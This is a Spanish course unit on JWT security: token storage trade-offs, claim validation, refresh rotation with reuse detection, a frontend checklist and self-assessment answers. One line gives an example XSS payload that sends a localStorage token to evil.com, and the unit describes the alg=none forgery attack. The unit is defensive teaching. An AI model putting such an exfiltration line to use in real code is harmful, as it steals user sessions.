# Unidad 03 — JWT y buenas prácticas

## Objetivos

Al terminar esta unidad serás capaz de:

- Comparar los tres lugares habituales para guardar tokens (cookie httpOnly, memoria, `localStorage`) según el riesgo de XSS y CSRF, y elegir uno conscientemente.
- Explicar qué claims debe validar un servidor JWT (`alg`, `iss`, `aud`, `exp`, `nbf`, `jti`) y por qué el payload **no** es secreto.
- Diseñar una estrategia de vida útil: access token corto + refresh con rotación y detección de reutilización.
- Aplicar la **checklist frontend** de seguridad a cualquier proyecto (logs, secrets en env, 401 sin bucles, subida de archivos...).

## Requisitos

- Haber leído las unidades 01 y 02 (XSS/CSRF y CORS/OAuth): aquí se integran sus conceptos.
- Conocer M8 a nivel de "he llamado a `/login` y me han devuelto un token".
- Poder abrir DevTools → Application → Cookies/Local Storage y Network.
- No hace falta saber criptografía: basta con entender que un JWT tiene tres partes y una firma.

---

## ¿Qué es un JWT, en humanos?

Un **JSON Web Token** es un ticket de entrada firmado. Imagina el brazalete de un festival: llevas tus datos (nombre, tipo de pase, validez) en claro, y la organización los sella con una firma que nadie puede falsificar sin la clave. Si alteras una letra del brazalete, la firma deja de cuadrar y en la puerta te lo rechazan.

Estructura: `header.payload.signature`, todo en base64url. El **payload** (claims) es JSON legible por cualquiera: lo que protege la firma es la **integridad**, no la **confidencialidad**. Nunca metas ahí contraseñas, números de tarjeta ni otro dato sensible: basta con decodificar base64 en el cliente de tu elección.

```text
eyJhbGciOi...   .   eyJzdWIiOiI0MiIsInJvbGUiOiJhZG1pbiJ9   .   Mo7bm3X...
     header                payload (claims)                        firma
```

---

## Almacenar tokens (trade-offs)

| Ubicación | XSS | CSRF | Notas |
|-----------|-----|------|-------|
| Cookie httpOnly+SameSite | bajo | mitigado | recomendado SPA misma origen |
| Memory (variable) | medio | bajo | refresh al cargar |
| localStorage | **alto** | bajo | roba con cualquier XSS |

Ninguna opción es gratis: la tabla existe precisamente porque cada elección **cambia un riesgo por otro**. Veamos las tres filas con detalle.

### 1. Cookie `httpOnly` + `SameSite` (+ `Secure`)

El token vive en una cookie que **el JavaScript no puede leer** (`HttpOnly`), que no se envía a ciegas en cross-site (`SameSite=Lax/Strict`) y que solo viaja por HTTPS (`Secure`).

- **XSS bajo**: aunque un script logre ejecutarse, `document.cookie` no muestra la cookie; no puede robarla con la técnica clásica.
- **CSRF mitigado**: `SameSite` limita el envío cross-site; aun así se recomienda mantener token CSRF o headers custom para mutaciones (Unidad 01).
- **Cuándo**: SPAs servidas desde el **mismo origen** que la API (proxy o subdominios bien configurados). Es la opción recomendada cuando puedes tenerlo.

```http
Set-Cookie: refresh=...; HttpOnly; Secure; SameSite=Strict; Path=/api/auth
```

### 2. En memoria (una variable / store de estado)

El access token vive en una variable JS (React state, Zustand, closure):

- **CSRF bajo**: viaja en header `Authorization`, el navegador no lo adjunta solo.
- **XSS medio**: el script del atacante *puede* leer la variable si se ejecuta en tu página... pero al recargar la pestaña desaparece, así que el robo debe ser en caliente y aprovecharlo rápido.
- **Nota**: se pierde al refrescar → hace falta un mecanismo de **refresh al cargar** (cookie httpOnly de refresh que el `main.jsx` canjea por un access nuevo).

Es el equilibrio más habitual en SPAs modernas: **access en memoria + refresh en cookie httpOnly**.

### 3. `localStorage`

El clásico de los tutoriales:

- **CSRF bajo** (header `Authorization`).
- **XSS alto**: cualquier `fetch('https://evil.com?d='+localStorage.getItem('token'))` dentro de un XSS extrae la sesión entera, y además **persiste**: no basta con robarla, el atacante puede esperar a que el usuario vuelva. Con `localStorage` no hay rotación que aguante si el payload vive indefinidamente.
- **Cuándo**: solo si el token es de bajo impacto, o a sabiendas del trade-off. Elegir `localStorage` *y* olvidarse de sanitizar XSS es elegir el peor de los dos mundos.

**Regla de oro**: el almacenamiento que elijas decide *qué ataque te puede doler*. No hay "el más seguro" abstracto: hay el más adecuado a tu arquitectura (¿mismo origen?, ¿necesitas CSRF-proof?, ¿qué daño hace un token robado?).

---

## Claims y validación

- `alg`: rechazar `none`; fijar HS256/RS256 esperado.
- Validar `iss`, `aud`, `exp`, `nbf`.
- Minimizar payload: **no** PII sensible en JWT (es legible).
- `jti` + allowlist/denylist para logout real.

Desglose, porque cada bullet esconde un ataque real:

- **`alg`: rechazar `none`; fijar HS256/RS256 esperado.**  
  El header del JWT incluye el algoritmo. El ataque histórico *alg=none* consiste en firmar un token sin firma y confiar en que el servidor "hará lo que diga el token". Un servidor bien configurado **no pregunta al token** qué algoritmo usar: tiene fijado el esperado (HS256 con secreto compartido, o RS256 con clave pública) y rechaza todo lo demás.

- **Validar `iss`, `aud`, `exp`, `nbf`.**  
  - `iss` (issuer): ¿lo emitió *mi* servidor de tokens?  
  - `aud` (audience): ¿está destinado a *mi* API? (Evita que un token emitido para otra app valga aquí.)  
  - `exp`: ¿no ha caducado?  
  - `nbf` (*not before*): ¿aún no es válido? (Útil para tokens "activos a partir de...")  
  Un JWT sin comprobar estos claims es un papel sellado que nadie mira: cualquiera puede reenviar uno viejo o de otro servicio.

- **Minimizar payload: no PII sensible en JWT (es legible).**  
  Cualquiera con el token puede `base64 -d` el payload. Nada de emails si puedes evitarlo, y jamás datos de salud, DNI, tarjetas o permisos internos que no necesites en cada request.

- **`jti` + allowlist/denylist para logout real.**  
  Un JWT es *stateless*: emitido, vale hasta `exp` aunque el usuario haga logout. Para logout real u invalidación inmediata («cierra sesión en todos lados», «revoca este refresh») necesitas un `jti` (id único del token) y contrastarlo con una lista de revocados (Redis, BD) en el servidor. Cuesta un look-up, pero es la única forma de invalidar antes de tiempo.

### Del lado del cliente

El cliente **no** debe "validar" la firma (no tiene la clave privada; además, cualquier JS puede forzar un resultado). Tu trabajo como frontend es:

- Guardar el token donde decidiste (tabla anterior).
- Adjuntarlo en `Authorization` o dejar que viaje la cookie.
- Interpretar `401` → intentar refresh una vez → si falla, a login.
- Interpretar `403` → el token es válido pero **no tienes permiso** (rol/ownership): mostrar 403, no reloguear en bucle.

---

## Rotación y vida útil

```text
access 5–15 min  +  refresh 7–30 d (rotación + reuse detection)
```

La intuición de muchos es: *¿un access token de 5 minutos? ¡voy a estar pidiendo refresh cada dos por tres!* En la práctica no: el access se renueva en silencio (interceptor de `fetch`/axios o al refrescar la página con la cookie de refresh), y la caducidad corta es lo que limita el daño si alguien lo roba —un token robado que caduca en 10 minutos es una ventana pequeña, no un pase permanente.

- Enviar en body o cookie httpOnly + `Secure` + `SameSite`.
- Rate limit `/login` y `/refresh`.

Puntos clave:

1. **Access 5–15 min**: viaja en cada petición; caducidad corta = riesgo acotado.
2. **Refresh 7–30 días con rotación**: cada vez que se usa para obtener un access nuevo, el servidor emite un refresh **nuevo** y revoca el anterior.
3. **Reuse detection**: si aparece un refresh que ya fue canjeado (seguía "válido" pero ya rotado), es señal de robo → se revoca **toda la cadena** (familia de tokens). Es el equivalente a detectar que alguien fotografió tu brazalete: cancelas todos.
4. **Transporte**: `HttpOnly; Secure; SameSite` en cookie, o en body solo si hablas sobre HTTPS con un cliente de confianza.
5. **Rate limit `/login` y `/refresh`**: sin límite, un atacante fuerza contraseñas o prueba tokens robados a velocidad de máquina.

```text
[Access 5-15 min] --caduca--> usa [Refresh 7-30 d] --> emite Access nuevo + Refresh nuevo (rotación)
                                    │
                                    └─ si el viejo refresh aparece otra vez → revoke familia
```

---

## Checklist frontend

- [ ] No loguear tokens ni headers Authorization
- [ ] No montar secrets en `VITE_*` / `NEXT_PUBLIC_*`
- [ ] Validar contenido en UI como **no confiable**
- [ ] HTTPS siempre; HSTS en prod
- [ ] Dependencias actualizadas (audit)
- [ ] Errores 401 → redirect login sin bucles
- [ ] Subida de archivos: tipos + tamaño + storage no público sin auth

Cada punto, explicado para que lo apliques sin dudar:

- **No loguear tokens ni headers Authorization.** Un `console.log(config)` de axios imprime el header completo. En produción, DevTools abiertas o logs a un servicio de monitorización = sesión regalada. Quita logs de debug antes de desplegar y filtra lo sensible.

- **No montar secrets en `VITE_*` / `NEXT_PUBLIC_*`.** En Vite/Next, esas variables **se compilan en el bundle** y cualquiera las ve en Network/JS. Sirven para `VITE_API_URL`, flags públicos... jamás para client secrets, claves de pago o credenciales de terceros.

- **Validar contenido en UI como no confiable.** Todo lo que pintas (nombres, comentarios, mensajes de error del backend, datos de terceros) es dato, no instrucción: escápalo/`{...}` (Unidad 01), valida shape y tipos antes de usarlo.

- **HTTPS siempre; HSTS en prod.** HTTP envía cookies y tokens en claro. **HSTS** (`Strict-Transport-Security`) fuerza al navegador a usar siempre HTTPS, evitando downgrade por red hostil (WiFi del aeropuerto).

- **Dependencias actualizadas (audit).** `pnpm audit` / `npm audit` consulta los advisories conocidos de tus dependencias. Un CVE en tu librería de auth es XSS/CSRF gratis para el atacante.

- **Errores 401 → redirect login sin bucles.** Si el interceptor redirige a `/login` en cada 401 y la propia página de login devuelve 401 (o el refresh también falla y dispara otro redirect), entras en bucle infinito. Patrón: distinguir 401 de 403, intentar refresh **una** vez, y solo entonces login, con guarda para no redirigir si ya estás en `/login`.

- **Subida de archivos: tipos + tamaño + storage no público sin auth.** Valida MIME y extensión **y tamaño** en cliente (UX) **y** en servidor (fuente de verdad); almacena fuera del árbol público o con URLs firmadas/autorizadas. Un `upload/` servido sin auth es un disco duro público para el mundo (y un vector de XSS si sirves HTML/SVG).

---

## Errores comunes

| Error | Consecuencia | Qué hacer |
|-------|--------------|-----------|
| Guardar el JWT en `localStorage` "porque es fácil" | Cualquier XSS roba la sesión de forma persistente | Access en memoria + refresh en cookie httpOnly, o cookie completa si es mismo origen |
| Decodificar el JWT en el front y "validar" la firma ahí | El JS del atacante puede alterar el resultado; no tienes la clave | La firma la valida el **server**; el front solo usa los claims como UI hint |
| Confiar en claims del cliente (p. ej. `role: admin`) para autorizar | Editar el payload local = escalar privilegios | Autorización real en el servidor con su propia verificación |
| Loguear `Authorization` o el objeto de config completo | Fuga de sesión en logs/monitorización | Logging con redacción explícita |
| `alg: none` aceptado o algoritmo elegido según el token | Forjado de tokens | Fijar algoritmo esperado en el servidor |
| Access token eterno (sin `exp` o de días) | Un robo es indefinido | Access 5–15 min + refresh rotativo |
| Logout que solo borra el state del front | El token sigue siendo válido hasta `exp` | `jti` + denylist/allowlist en server |
| 401 → `navigate('/login')` sin guarda | Bucle infinito de redirects | Refresh único, no reloguear si ya en login, distinguir 403 |
| Secrets reales en `.env` con prefijo público | Van al bundle en Vite/Next | Solo variables públicas no sensibles; secretos en el server |

---

## Conceptos clave

- **JWT**: token firmado `header.payload.signature`; integridad garantizada, **contenido legible**.
- **Claims**: pares del payload (`sub`, `iss`, `aud`, `exp`, `nbf`, `jti`, `role`...).
- **Almacenamiento**: cookie httpOnly (XSS bajo / CSRF mitigado con SameSite), memoria (fresco, se pierde al reload), `localStorage` (XSS alto).
- **`HttpOnly` / `Secure` / `SameSite`**: atributos de cookie que ocultan al JS, exigen HTTPS y limitan envío cross-site.
- **Access vs refresh token**: corto y viajero vs largo, rotativo y mejor protegido.
- **Rotación de refresh**: emitir refresh nuevo y revocar el anterior en cada uso.
- **Reuse detection**: detectar reutilización de un refresh ya canjeado → revocar la familia de tokens (posible robo).
- **Validación server-side**: fijar `alg`; comprobar `iss`, `aud`, `exp`, `nbf` en cada request autenticado.
- **`jti` + denylist/allowlist**: identificador único para logout/revocación real en arquitectura stateless.
- **PII en JWT**: prohibido; el payload es legible sin clave.
- **Rate limit**: límite de intentos en `/login` y `/refresh` contra fuerza bruta.
- **401 vs 403**: 401 = no autenticado (refresh o login); 403 = autenticado pero sin permiso (no reloguear).
- **Variables públicas**: `VITE_*` / `NEXT_PUBLIC_*` quedan en el bundle; nunca secretos.
- **HSTS**: fuerza HTTPS en prod; evita downgrade.
- **`pnpm audit`**: detección de vulnerabilidades conocidas en dependencias.

---

## Autoevaluación

**1. Un compañero pone el refresh token en `localStorage` "para no complicarse con cookies". ¿Qué le explicas sobre XSS y CSRF, y qué alternativa propones?**

<details>
<summary>Respuesta</summary>

CSRF apenas le afecta si viaja en header `Authorization`, **pero** el `localStorage` es legible por cualquier JS: un único XSS le roba un token **largo-lived** (7–30 días) y de forma persistente, con lo que el daño es enorme. Alternativa: **refresh en cookie `HttpOnly; Secure; SameSite`** (invisible al JS, protegida frente a CSRF por SameSite +, si aplica, token CSRF) y **access token en memoria**, refrescándolo al cargar la app. Si su API y SPA van en el mismo origen, puede incluso usar cookies para todo.

</details>

**2. El servidor recibe un JWT con header `{"alg":"none","typ":"JWT"}` y un payload que dice `{"role":"admin"}`. ¿Qué debe hacer y por qué?**

<details>
<summary>Respuesta</summary>

**Rechazarlo.** El servidor debe tener **fijado** el algoritmo esperado (HS256/RS256) y no dejarse guiar por el `alg` del token; `none` es el ataque clásico de forjado. Además debe validar firma, `iss`, `aud`, `exp`/`nbf` en su propio servidor: nunca confiar en claims llegados del cliente sin verificar. Cualquiera puede editar el payload de un JWT si no hay firma válida que comprobar.

</details>

**3. ¿Por qué `access 5–15 min + refresh rotativo` es mejor que un solo token bueno para 30 días?**

<details>
<summary>Respuesta</summary>

Con un token largo que viaja en cada petición, cualquier robo (XSS, logs, red) otorga acceso **durante todo el mes**, sin revocación posible. Con access corto, la ventana de daño es de minutos; el refresh —que no viaja en cada request y vive en cookie httpOnly— renueva el acceso. La **rotación** invalida el refresh anterior en cada uso y la **reuse detection** revoca la familia si alguien reutiliza uno viejo (señal de robo), convirtiendo un robo puntual en un incidente controlable.

</details>

**4. El usuario pulsa "Cerrar sesión" pero el access token sigue siendo válido 8 minutos. ¿Es un fallo? ¿Cómo harías un logout real?**

<details>
<summary>Respuesta</summary>

Es el comportamiento normal de un JWT stateless: el front borra su copia, pero el server lo aceptaría hasta `exp`. Para logout **real**: en el cliente borrar access (memoria) y refresh (cookie, vía endpoint); en el servidor invalidar el `jti` del refresh (y si quieres también el del access) en una **denylist/allowlist** que se consulte en cada request, además de revocar la familia de refresh. Eso sí cuesta un look-up, pero es la única forma de invalidar antes de `exp`.

</details>
